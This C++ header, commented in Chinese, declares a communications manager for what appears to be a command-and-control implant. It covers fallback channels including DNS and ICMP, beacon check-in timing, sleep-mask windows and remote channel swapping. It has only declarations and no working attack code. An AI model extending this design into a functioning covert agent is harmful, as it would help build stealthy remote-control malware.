// CommsManager.hpp — 通信门面：经 Channel::Chain 使用当前通道，向上层提供稳定收发接口。

#pragma once

#include <cstdint>
#include <functional>
#include <string>
#include <vector>

#include "Core/Comms/Channel/Chain.hpp"

namespace cleat {

    // 通信管理器：封装 Chain 和出站队列，提供统一的数据收发接口。
    class CommsManager {
    public:
        explicit CommsManager(Chain& chain);

        // 禁止拷贝和移动
        CommsManager(const CommsManager&) = delete;
        CommsManager& operator=(const CommsManager&) = delete;
        CommsManager(CommsManager&&) = delete;
        CommsManager& operator=(CommsManager&&) = delete;

        ~CommsManager();

        // 建立连接，委托给 Chain
        bool Connect(const std::string& host, uint16_t port);

        // 断开当前连接
        void Disconnect();

        // 整体替换候选链（运行期热切换，SetConfig channels 域触发）
        void ReplaceChannels(ChannelCandidates cands);

        bool IsConnected() const;

        // 当前通道是否为低带宽（DNS/ICMP），上层据此暂停大流量任务
        bool IsLowBandwidth() const;

        // v1.5 节奏合一(设计): 当前通道距下一次 check-in 到期(0 = 不可得)
        // —— 稳态掩码窗长源: 窗长 := min(本值, mask.sleep_ms 上限)
        uint32_t NextPollDueInMs() const;

        // v1.5 收尾(稳态掩码门): 当前通道待落线上行分片字节(0 = 无; sink 排空 ≠ 干完)
        uint32_t PendingUplinkBytes() const;

        /**
         * @brief 取一帧(N32/L-1: **唯一收包入口** —— 经 `Chain::Recv`)
         * @details 会话层把本函数作为收帧回调注入 `SessionRunner::Tick`; `Chain::Recv` 内含
         *          "降级运行时回探更高优先候选"与收侧失败计数 —— 生产与夹具因此走同一条路径。
         *          早前存在第二条入站路径(`SetOnPacketCallback` + `ProcessIncoming`), 已删除:
         * @return 取到一帧 true; 无帧或通道不可用 false(非错误)
         */
        bool RecvFrame(std::vector<uint8_t>& frame);

    private:
        Chain& chain_;
    };

} // namespace cleat
